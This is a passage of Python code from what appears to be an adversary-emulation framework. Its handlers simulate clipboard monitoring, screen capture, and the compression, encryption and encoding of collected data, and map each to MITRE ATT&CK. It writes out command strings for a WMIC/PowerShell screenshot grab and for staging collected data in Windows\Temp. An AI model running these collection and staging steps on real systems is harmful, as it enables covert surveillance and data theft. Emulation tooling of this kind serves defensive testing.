            result["details"]["capture_start_time"] = datetime.now().isoformat()
            result["details"]["scheduled_end_time"] = (datetime.now() + timedelta(seconds=duration)).isoformat()
            
            # Method-specific details
            if capture_method == "polling":
                result["details"]["api"] = "GetClipboardData"
                result["details"]["implementation"] = "Periodically check clipboard for changes"
            elif capture_method == "hook":
                result["details"]["api"] = "AddClipboardFormatListener"
                result["details"]["implementation"] = "Register for clipboard content change notifications"
            elif capture_method == "dll":
                result["details"]["api"] = "SetClipboardViewer"
                result["details"]["implementation"] = "Legacy clipboard viewer chain"
            
            # Formats to monitor
            result["details"]["formats"] = [
                "CF_TEXT", 
                "CF_UNICODETEXT", 
                "CF_BITMAP", 
                "CF_HDROP"
            ]
            
            # Simulated clipboard monitor stats
            result["details"]["statistics"] = {
                "items_captured": 0,
                "last_capture_time": "N/A",
                "active": True,
                "log_size": 0
            }
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1115"
            result["details"]["mitre_technique_name"] = "Clipboard Data"
            
            return result
        except Exception as e:
            self._log_error(f"Error in clipboard capture: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _handle_screen_capture(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle screen capture"""
        try:
            result = {
                "status": "success",
                "technique": "screen_capture",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            capture_method = data.get("method", "gdi")
            output_dir = data.get("output_dir", "C:\\Windows\\Temp\\screenshots")
            interval = data.get("interval", 30)  # Every 30 seconds
            format = data.get("format", "png")
            quality = data.get("quality", 85)
            duration = data.get("duration", 3600)  # 1 hour default
            
            result["details"]["capture_method"] = capture_method
            result["details"]["output_directory"] = output_dir
            result["details"]["interval"] = interval
            result["details"]["format"] = format
            result["details"]["quality"] = quality
            result["details"]["duration"] = duration
            
            # Screen capture implementation
            result["details"]["capture_start_time"] = datetime.now().isoformat()
            result["details"]["scheduled_end_time"] = (datetime.now() + timedelta(seconds=duration)).isoformat()
            
            # Method-specific details
            if capture_method == "gdi":
                result["details"]["api"] = "BitBlt/CreateDC"
                result["details"]["implementation"] = "GDI BitBlt to capture screen contents"
            elif capture_method == "directx":
                result["details"]["api"] = "IDXGIOutputDuplication"
                result["details"]["implementation"] = "DirectX screen duplication"
            elif capture_method == "wmic":
                result["details"]["api"] = "WMIC process call create"
                result["details"]["implementation"] = "Use WMIC to launch external screenshot utility"
                result["details"]["command"] = "wmic process call create \"powershell -c Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -m 250; $bitmap = [System.Windows.Forms.Clipboard]::GetImage(); $bitmap.Save('screenshot.png')\""
            
            # Calculate expected file size based on resolution and format
            width = 1920  # Simulated screen width
            height = 1080  # Simulated screen height
            bytes_per_pixel = 3
            
            raw_size = width * height * bytes_per_pixel
            compressed_size = int(raw_size * (quality / 100) * (0.1 if format == "png" else 0.05 if format == "jpg" else 0.5))
            
            # Simulated screen capture stats
            result["details"]["statistics"] = {
                "captures_taken": 0,
                "resolution": f"{width}x{height}",
                "estimated_size_per_capture": compressed_size,
                "active": True
            }
            
            result["details"]["expected_captures"] = duration // interval
            result["details"]["expected_total_size"] = compressed_size * (duration // interval)
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1113"
            result["details"]["mitre_technique_name"] = "Screen Capture"
            
            return result
        except Exception as e:
            self._log_error(f"Error in screen capture: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _handle_compression(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle compression"""
        try:
            result = {
                "status": "success",
                "technique": "data_compression",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            compression_type = data.get("type", "zip")
            source_data = data.get("source", "C:\\Collected\\Data")
            output_file = data.get("output", f"C:\\Windows\\Temp\\compressed_{self._generate_random_string(8)}.{compression_type}")
            compression_level = data.get("level", 6)  # 0-9 range, 9 is highest
            
            result["details"]["compression_type"] = compression_type
            result["details"]["source_data"] = source_data
            result["details"]["output_file"] = output_file
            result["details"]["compression_level"] = compression_level
            
            # Compression implementation
            # Simulate compression ratios based on file types
            source_size = random.randint(10*1024*1024, 100*1024*1024)  # 10MB to 100MB
            
            # Different compression ratios based on type
            if compression_type == "zip":
                ratio = random.uniform(0.6, 0.8)  # 60-80% reduction
                result["details"]["command"] = f"7z a -tzip -{compression_level} {output_file} {source_data}"
            elif compression_type == "7z":
                ratio = random.uniform(0.5, 0.7)  # 50-70% reduction
                result["details"]["command"] = f"7z a -t7z -{compression_level} {output_file} {source_data}"
            elif compression_type == "rar":
                ratio = random.uniform(0.55, 0.75)  # 55-75% reduction
                result["details"]["command"] = f"rar a -m{compression_level} {output_file} {source_data}"
            elif compression_type == "gzip":
                ratio = random.uniform(0.65, 0.85)  # 65-85% reduction
                result["details"]["command"] = f"gzip -{compression_level} -c {source_data} > {output_file}"
            
            compressed_size = int(source_size * ratio)
            
            # Compression statistics
            result["details"]["statistics"] = {
                "original_size": source_size,
                "compressed_size": compressed_size,
                "compression_ratio": f"{(compressed_size / source_size) * 100:.1f}%",
                "space_saved": source_size - compressed_size
            }
            
            # Compression timestamp
            result["details"]["compression_time"] = datetime.now().isoformat()
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1560"
            result["details"]["mitre_technique_name"] = "Archive Collected Data"
            
            return result
        except Exception as e:
            self._log_error(f"Error in data compression: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _handle_encryption(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle encryption"""
        try:
            result = {
                "status": "success",
                "technique": "data_encryption",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            encryption_type = data.get("type", "aes")
            source_data = data.get("source", "C:\\Collected\\Data")
            output_file = data.get("output", f"C:\\Windows\\Temp\\encrypted_{self._generate_random_string(8)}.enc")
            key_size = data.get("key_size", 256)
            
            result["details"]["encryption_type"] = encryption_type
            result["details"]["source_data"] = source_data
            result["details"]["output_file"] = output_file
            result["details"]["key_size"] = key_size
            
            # Encryption implementation
            # Generate key and IV (for demonstration)
            key = self._generate_random_string(key_size // 8)
            iv = self._generate_random_string(16) if encryption_type != "rsa" else None
            
            # Store key details (in a real scenario, this would be protected)
            result["details"]["key_hash"] = hashlib.sha256(key.encode()).hexdigest()
            if iv:
                result["details"]["iv_hash"] = hashlib.sha256(iv.encode()).hexdigest()
            
            # Source data size
            source_size = random.randint(10*1024*1024, 100*1024*1024)  # 10MB to 100MB
            
            # Encryption algorithm specific details
            if encryption_type == "aes":
                result["details"]["algorithm"] = "AES-256-CBC"
                result["details"]["command"] = f"openssl enc -aes-256-cbc -in {source_data} -out {output_file} -K {key} -iv {iv}"
            elif encryption_type == "rsa":
                result["details"]["algorithm"] = f"RSA-{key_size}"
                result["details"]["command"] = f"openssl rsautl -encrypt -inkey public_key.pem -pubin -in {source_data} -out {output_file}"
            elif encryption_type == "chacha20":
                result["details"]["algorithm"] = "ChaCha20-Poly1305"
                result["details"]["command"] = f"openssl enc -chacha20 -in {source_data} -out {output_file} -K {key} -iv {iv}"
            
            # Encryption statistics
            result["details"]["statistics"] = {
                "original_size": source_size,
                "encrypted_size": source_size + (16 if encryption_type != "rsa" else 0),  # AES/ChaCha padding
                "encryption_time": random.uniform(0.5, 5.0),  # Simulated time in seconds
            }
            
            # Encryption timestamp
            result["details"]["encryption_time"] = datetime.now().isoformat()
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1022"
            result["details"]["mitre_technique_name"] = "Data Encrypted"
            
            return result
        except Exception as e:
            self._log_error(f"Error in data encryption: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _handle_encoding(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle encoding"""
        try:
            result = {
                "status": "success",
                "technique": "data_encoding",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            encoding_type = data.get("type", "base64")
            source_data = data.get("source", "C:\\Collected\\Data")
            output_file = data.get("output", f"C:\\Windows\\Temp\\encoded_{self._generate_random_string(8)}.txt")
            
            result["details"]["encoding_type"] = encoding_type
            result["details"]["source_data"] = source_data
            result["details"]["output_file"] = output_file
            
            # Encoding implementation
            # Source data size
            source_size = random.randint(1024*1024, 10*1024*1024)  # 1MB to 10MB
            
            # Calculate encoded size based on encoding type
            if encoding_type == "base64":
                encoded_size = int(source_size * 1.37)  # ~4/3 increase
                result["details"]["command"] = f"openssl base64 -in {source_data} -out {output_file}"
            elif encoding_type == "hex":
                encoded_size = source_size * 2  # Each byte becomes 2 hex characters
                result["details"]["command"] = f"xxd -p {source_data} > {output_file}"
            elif encoding_type == "uuencode":
                encoded_size = int(source_size * 1.4)  # Rough approximation
                result["details"]["command"] = f"uuencode {source_data} {os.path.basename(source_data)} > {output_file}"
            
            # Encoding statistics
            result["details"]["statistics"] = {
                "original_size": source_size,
                "encoded_size": encoded_size,
                "ratio": f"{(encoded_size / source_size):.2f}",
                "encoding_time": random.uniform(0.2, 2.0)  # Simulated time in seconds
            }
            
            # Encoding timestamp
            result["details"]["encoding_time"] = datetime.now().isoformat()
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1132"
            result["details"]["mitre_technique_name"] = "Data Encoding"
            
            return result
        except Exception as e:
            self._log_error(f"Error in data encoding: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _log_error(self, message: str) -> None:
        """Log an error message."""
        # Ensure logger is available
        logger = getattr(self, 'logger', None)
        if logger:
            logger.error(message)
        else:
            # Basic print fallback if logger failed during init
            print(f"ERROR (Collection): {message}", file=sys.stderr)

    def _generate_random_string(self, length: int = 8) -> str:
        """Generate a random string of fixed length.""" 